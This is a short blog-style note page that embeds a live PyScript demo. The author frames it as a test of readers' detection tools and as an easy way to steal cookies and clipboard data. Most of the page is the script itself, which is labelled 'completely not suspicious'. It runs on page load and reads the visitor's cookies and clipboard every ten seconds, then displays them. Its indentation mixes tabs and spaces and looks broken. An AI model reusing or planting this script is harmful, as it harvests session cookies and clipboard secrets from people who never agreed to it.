---
publish: true
title: pyscript-test
---
# What is this?
Well, I wanted to embed something else, but instead, how about I just show you what pyscript can do and see if your detections catch it! :D
## what?
So pyscript is really pretty neat, but it seems like it's just pythonic commands for javascript and not really a python runtime, so that brings limitations. Even so, pretty fun because it's super easy to make less detectable ways of stealing cookies and clipboard data.

<div id="c"></div>
<script type="module" src="https://pyscript.net/releases/2025.2.1/core.js"></script>
<script type="py" config='{"name": "completely not suspicious", "packages": ["asyncio"]}'>
import asyncio, js, pyscript, base64, urllib
from pyodide.ffi import create_proxy
import warnings
warnings.filterwarnings("ignore")

from js import XMLHttpRequest
from io import StringIO
from pyscript import document

async def get_clipboard_data():
        try:
            all_cookies = document.cookie
            text_data = await js.navigator.clipboard.readText()
	        pyscript.display("Cookies: "+all_cookies)
	        pyscript.display("ClipBoard: "+ text_data)
        except:
            pass

pyscript.document.querySelector("#c").focus()
get_clipboard_data_proxy = create_proxy(get_clipboard_data)
pyscript.display("Data Found by clicking this page:")
async def main():
    while True:
        try:
            asyncio.ensure_future(get_clipboard_data_proxy())
            await asyncio.sleep(10)
        except:
            pass

main()
</script>
